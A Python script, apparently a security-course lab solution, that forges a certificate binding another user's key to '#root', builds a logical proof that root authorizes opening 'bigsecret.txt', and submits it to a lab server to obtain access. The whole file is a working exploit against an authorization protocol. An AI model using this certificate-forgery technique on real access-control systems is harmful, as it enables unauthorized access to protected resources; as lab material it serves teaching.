import sys
import json

from urllib.request import Request, urlopen
from urllib.parse import urlencode
from urllib.error import HTTPError

from crypto import Credential, Certificate, AccessRequest, new_user
from auth import generate_request
from parser import parse, judgement_parse
import prover
import logic
import proofrules
import util


def generate_exploit():

	newuser = logic.Agent('#newuser')
	ckoo = logic.Agent('#calebkoo')

	koo_public_key = Certificate.load_certificate(ckoo).public_key
	new_user_cert = Certificate.load_certificate(newuser) #new_user(newuser, newuser)
	koo_cert = Certificate.load_certificate(ckoo)
	ca_cert = Certificate.load_certificate(logic.Agent('#ca'))

	form = parse('open(#calebkoo, <bigsecret.txt>)')
	cred = Credential.from_formula(form, ckoo)
	#cred.signator = logic.Agent('#root')

	self_cert = Certificate.make_for_key(koo_public_key,
						  logic.Agent('#root'), newuser)
	
	cred2 = self_cert.cred
	cred3 = new_user_cert.cred
	cred4 = koo_cert.cred
	cred5 = ca_cert.cred
	
	#Certificate.make_for_key("insert newuser's public key here",
	#					  logic.Agent('#newuser'), logic.Agent('#newuser'))
	
	delta = judgement_parse('#root says open(#calebkoo, <bigsecret.txt>)')
	gamma = [judgement_parse('ca(#newuser)')]
	gamma += [judgement_parse('iskey(#newuser, [45:fb:a2:de:b4:da:6b:62:30:4f:be:ce:1c:05:52:e7])')]
	gamma += [judgement_parse('sign((iskey(#root, [ca:63:85:95:dc:f9:48:e4:cd:46:ec:4d:93:08:c5:c0])), [45:fb:a2:de:b4:da:6b:62:30:4f:be:ce:1c:05:52:e7])')]
	gamma += [judgement_parse('sign(open(#calebkoo, <bigsecret.txt>), [ca:63:85:95:dc:f9:48:e4:cd:46:ec:4d:93:08:c5:c0])')]
	seq = logic.Sequent(gamma, delta)
	pf = prover.prove2(seq)
	certs = [new_user_cert, self_cert, koo_cert, ca_cert]
	creds = [cred, cred2, cred3, cred4, cred5]


	"""cert_chain = {cert.agent: cert for cert in certs}
	for cert in certs:
		print(cert.agent)
	print(cert_chain)
	for cred in creds:
		print(cred)
		print(cert_chain[cred.signator].public_key)"""

	return AccessRequest.make_for_proof(pf, ckoo, creds, certs)
	req = generate_request(pf, logic.Agent('#calebkoo'))
	req.creds += creds
	req.certs += certs
	return req


"""
proof (Proof): A proof of the access request.
		signature (Credential): A credential representing a signature
			of the access request, signed by the agent making the
			request.
		creds (set[Credential]): Any credentials needed to verify the proof.
		certs (set[Certificate]): Any certificates needed to verify the
			credentials."""



if __name__ == '__main__':

	req = generate_exploit()
	if req is None:
		sys.exit(0)

	request = Request("http://authproof.net:15316/accessrequest",
					  data=urlencode({
						  "request": req.serialize()
					  }).encode('utf-8'),
					  headers={'Content-Encoding': 'gzip'},
					  method='POST')
	try:
		response_object = urlopen(request, timeout=10)
	except HTTPError as e:
		response_object = e

	resp_json = json.load(response_object)
	print('\nserver response:')
	try:
		new_cred = Credential.from_json(resp_json)
		print(new_cred)
	except:
		print(resp_json)